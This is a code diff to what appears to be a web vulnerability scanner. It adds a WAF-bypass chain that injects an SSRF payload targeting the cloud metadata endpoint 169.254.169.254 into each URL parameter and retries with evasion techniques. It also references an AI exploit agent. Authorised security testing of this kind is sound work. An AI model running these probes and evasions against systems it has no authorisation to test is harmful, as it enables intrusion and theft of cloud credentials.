@@ -290,6 +290,16 @@ def scan_ssrf(url: str, forms: list, delay: float, options: Optional[dict] = Non
 
     vulns.extend(run_concurrent_tasks(tasks, max_workers=threads))
 
+    # ── 3-tier WAF bypass chain (auto-tamper / AI evolution / protocol evasion) ──
+    # Conservative fallback before delegating to ai_exploit_agent: only fires
+    # when the main scan triggered a specific-WAF fingerprint.
+    if not vulns and params:
+        bypass_finding = _run_waf_bypass_chain_for_ssrf(
+            params, parsed, delay, baseline_text, baseline_len
+        )
+        if bypass_finding:
+            vulns.append(bypass_finding)
+
     if not vulns and params:
         try:
             from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
@@ -322,6 +332,88 @@ def scan_ssrf(url: str, forms: list, delay: float, options: Optional[dict] = Non
             pass
 
     return vulns
+
+
+def _run_waf_bypass_chain_for_ssrf(params, parsed, delay, baseline_text, baseline_len):
+    """3-tier WAF bypass over each URL param using a representative SSRF
+    cloud-metadata payload. Returns the first finding or None.
+
+    Activates only when ``waf_detector.detected_waf`` is non-empty.
+    """
+    from utils.waf import waf_detector
+
+    waf_name = getattr(waf_detector, "detected_waf", "") or ""
+    if not waf_name:
+        return None
+
+    from utils.waf_evasion import apply_waf_bypass_chain
+
+    seed_payload = "http://169.254.169.254/latest/meta-data/"
+
+    log_info(f"⚡ SSRF: 3-tier WAF bypass attempt against {waf_name}")
+
+    for param in list(params.keys()):
+        state = {"params": params.copy()}
+
+        def request_fn(p, *, evasion_level=0):
+            test_params = state["params"]
+            test_params[param] = [p]
+            test_url = urlunparse(
+                parsed._replace(query=urlencode(test_params, doseq=True))
+            )
+            state["last_test_url"] = test_url
+            try:
+                return smart_request(
+                    "get", test_url, delay=delay, evasion_level=evasion_level
+                )
+            except ScanExceptions:
+                return None
+
+        def check_fn(response, p, source):
+            if response is None:
+                return None
+            body = getattr(response, "text", "") or ""
+            # detect_ssrf returns (category, signature) — both None when no
+            # SSRF signal is present. The tuple itself is truthy so we MUST
+            # unpack and test the category before declaring a finding.
+            category, sig = detect_ssrf(body, p, baseline_text, baseline_len)
+            if not category:
+                return None
+            test_url = state.get("last_test_url", "")
+            increment_vulnerability_count()
+            log_vuln(f"SSRF via WAF bypass! [{source}]")
+            log_success(f"Param: {param} | {category}: {sig} | {source}")
+            return {
+                "type": "SSRF",
+                "category": category,
+                "url": test_url,
+                "param": param,
+                "payload": p,
+                "evidence": str(sig)[:200],
+                "severity": "HIGH",
+                "description": (
+                    f"SSRF in '{param}' via WAF bypass chain ({source}). "
+                    f"WAF: {waf_name}"
+                ),
+                "source": f"WAF Bypass Chain ({source})",
+                "waf": waf_name,
+            }
+
+        seed_resp = request_fn(seed_payload)
+        if seed_resp is None:
+            continue
+
+        finding = apply_waf_bypass_chain(
+            payload=seed_payload,
+            blocked_response=seed_resp,
+            request_fn=request_fn,
+            check_fn=check_fn,
+            waf_name=waf_name,
+            vuln_label="SSRF",
+        )
+        if finding:
+            return finding
+    return None
 
 # ── Async version ─────────────────────────────────────────────────────────
 
